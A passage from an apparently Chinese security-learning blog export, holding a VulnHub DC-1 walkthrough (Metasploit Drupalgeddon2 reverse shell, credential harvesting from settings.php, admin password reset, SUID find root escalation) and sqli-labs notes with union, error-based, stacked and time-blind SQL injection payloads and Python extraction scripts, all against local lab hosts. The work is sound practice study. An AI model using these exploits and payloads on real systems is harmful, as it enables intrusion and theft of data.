<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">发现下面有个falg4  flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">cd /home/flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>

<br>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看网站配置 看有什么有用信息</span><br><span class="line">cd /var/www/site/default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>用python反弹个交互式shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<br>

<br>

<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>顺便得到了数据库信息，登录数据库看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupal密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts/password-hash.sh)</span><br><span class="line">php scripts/password-hash.sh admin  (admin是你要设置的新密码)</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin</span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去数据库修改密码</span><br><span class="line">mysql&gt; update users set pass =&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">重置完密码后登录网站 (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7debd13b/DCchallenges1.png"></p>
<br>

<br>

<br>

<p>但是发现当前权限不够</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>使用<code>find</code>提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec ls /root \;</span><br><span class="line">find dctest -exec ls /root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:/var/www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs总结</title>
    <url>/posts/6db7f8ba/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs5</title>
    <url>/posts/fdded023/</url>
    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>

<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
<p>dbs challenges</p>
<p>table qpu4f7zhcb</p>
<p>columns  sessid,secret_6KIK,tryy</p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
<br>

<p>id=0’ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  –+</p>
<br>

<br>

<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>闭合 </p>
<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
<p>secret_MCQ1</p>
<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
<br>

<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>闭合 方法还是一样的</p>
<br>

<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
<br>

<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
<p>尝试报错注入</p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
<br>

<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>数字型 和58一样</p>
<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>用<code>&quot;)</code>闭合 和58一样</p>
<br>

<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>用<code>&#39;))</code>闭合</p>
<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>用<code>&#39;)</code>闭合 这关没回显 使用时间盲注</p>
<p>根据前面几关可以得到</p>
<p>数据库为 challenges</p>
<p>table 是随机10为字符组成</p>
<p>column是secret_ 和四位随机字符组成 </p>
<p>本关限制重置次数为130次，可以写个python脚本试一下</p>
<br>

<br>

<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#已知表长为10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelina是正常页面下的结果</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 字段为secret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
<br>

<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
<br>

<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
    <url>/posts/ccb4aa11/</url>
    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样</p>
<p>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
<p>如果网段一致，就重新启动下网卡（禁用后再启动即可）</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs4</title>
    <url>/posts/8ad9e0b5/</url>
    <content><![CDATA[<h3 id="42-堆叠注入"><a href="#42-堆叠注入" class="headerlink" title="42 堆叠注入"></a>42 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>只对username做了处理，对password没有处理</p>
<p><code>login_user=admin&amp;login_password=1%27%3Bcreate+table+test44 like users%23&amp;mysubmit=Login</code></p>
<br>

<h3 id="43-堆叠注入"><a href="#43-堆叠注入" class="headerlink" title="43 堆叠注入"></a>43 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和上一关差不多，使用<code>&#39;)</code>闭合</p>
<br>

<h3 id="44-堆叠注入"><a href="#44-堆叠注入" class="headerlink" title="44 堆叠注入"></a>44 堆叠注入</h3><p>和42一样</p>
<br>

<h3 id="45-堆叠注入"><a href="#45-堆叠注入" class="headerlink" title="45 堆叠注入"></a>45 堆叠注入</h3><p>和43一样</p>
<br>

<h3 id="46-order-by注入"><a href="#46-order-by注入" class="headerlink" title="46 order by注入"></a>46 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>使用<code>?sort=1%20desc</code>或者<code>?sort=1%20asc</code> 数据不同，可以使用报错注入</p>
<p><code>?sort=1 updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>也可以使用时间盲注</p>
<p><code>?sort=1 and if(1=1,sleep(1),0)</code>会响应一段时间</p>
<p><code>?sort=1 and if(1=1,0,sleep(1))</code> 会即可得到信息</p>
<br>

<br>

<h3 id="47-order-by注入"><a href="#47-order-by注入" class="headerlink" title="47  order by注入"></a>47  <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?sort=1&#39; desc --+</code>   <code>?sort=1&#39; asc --+</code></p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<br>

<h3 id="48-order-by注入"><a href="#48-order-by注入" class="headerlink" title="48 order by注入"></a>48 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以参考46</p>
<p>这关没回显，考虑使用时间盲注</p>
<br>

<p>SQlmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-48/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="49-order-by注入"><a href="#49-order-by注入" class="headerlink" title="49 order by注入"></a>49 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?sort=1%27%20%20and%20sleep(1)--+</code>时间盲注</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-49/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="50-order-by注入-amp-堆叠注入"><a href="#50-order-by注入-amp-堆叠注入" class="headerlink" title="50 order by注入&amp;堆叠注入"></a>50 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure>

<p>order by注入和堆叠注入</p>
<p>数字型 可以使用时间盲注和报错注入</p>
<p><code>?sort=1%20and%20sleep(1)</code></p>
<p><code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>堆叠注入</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;50&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="51-order-by注入-amp-堆叠注入"><a href="#51-order-by注入-amp-堆叠注入" class="headerlink" title="51 order by注入&amp;堆叠注入"></a>51 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)) </span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<p>堆叠注入</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;51&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="52-order-by注入-amp-堆叠注入"><a href="#52-order-by注入-amp-堆叠注入" class="headerlink" title="52 order by注入&amp;堆叠注入"></a>52 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure>

<br>

<p>堆叠注入</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;52&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<br>

<h3 id="53-order-by注入-amp-堆叠注入"><a href="#53-order-by注入-amp-堆叠注入" class="headerlink" title="53 order by注入&amp;堆叠注入"></a>53 <code>order by</code>注入&amp;堆叠注入</h3><p>堆叠注入</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs3</title>
    <url>/posts/14bd7516/</url>
